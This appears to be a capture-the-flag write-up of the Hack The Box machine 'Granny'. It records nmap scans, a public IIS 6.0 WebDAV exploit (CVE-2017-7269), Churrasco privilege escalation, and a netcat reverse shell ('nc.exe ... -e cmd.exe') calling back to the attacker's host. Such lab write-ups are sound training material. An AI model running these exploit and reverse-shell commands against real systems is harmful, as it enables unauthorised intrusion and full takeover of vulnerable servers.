**Ping** 
```
ping 10.10.10.15
```
![[Pasted image 20240615173135.png]]

Nmap Default Scan
```
nmap 10.10.10.15 -oN dnmap
```
![[Pasted image 20240615174521.png]]

Nmap Script and Service scan
```
nmap 10.10.10.15 -sCV -A -oN snmap
```
![[Pasted image 20240615174547.png]]

Nmap All Port Scan
```
nmap 10.10.10.15 -p- --min-rate 10000 -oN anmap
```
![[Pasted image 20240615174601.png]]

Port 80
![[Pasted image 20240615174626.png]]



Will Search Public Exploit For IIS 6.0
![[Pasted image 20240615174944.png]]
Will use this exploit https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
![[Pasted image 20240615175832.png]]

I have saved the python code in a file named exp.py and ran the exploit 
```
python2 exp.py 10.10.10.15 80 10.10.14.2 80
```
![[Pasted image 20240615175055.png]]

```
rlwrap nc -nvlp 80
```
![[Pasted image 20240615175127.png]]
Got shell.

Will move jump to Privilege escalation...!

Our Privileges
```
whoami /priv
```
![[Pasted image 20240615175321.png]]

```
Systeminfo
```
![[Pasted image 20240615175404.png]]
looks like there must be some kernel exploit.

Ran exploit suggester
```
python3 wes.py systeminfo.txt -c
```
![[Pasted image 20240615193657.png]]

Gonna use this exploit
![[Pasted image 20240615193738.png]]
In exploit-db there is no pre compiled binary, So i found one,
Found the Pre compiled binary:https://github.com/Re4son/Churrasco/raw/master/churrasco.exe

So once downloaded, I have Transferred the binary to target using SMB Share
```
impacket-smbserver kali .
```
![[Pasted image 20240615193949.png]]

```
copy \\10.10.14.2\kali\churrasco.exe
```
![[Pasted image 20240615194029.png]]

Lets check whether the binary is working or not
```
churrasco.exe whoami
```
![[Pasted image 20240615194122.png]]

So No I will transfer nc.exe to the target machine and get a shell as admin
```
churrasco.exe -d "nc.exe 10.10.14.2 443 -e cmd.exe"
```
![[Pasted image 20240615194217.png]]

Got reverse shell
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240615194245.png]]

Found the location of flags
```
dir /s /b C:\user.txt
```
```
dir /s /b C:\root.txt
```
![[Pasted image 20240615194400.png]]

Got the flags.
**user.txt**
![[Pasted image 20240615194440.png]]

**root.txt**
![[Pasted image 20240615194515.png]]



Done with Granny......:) 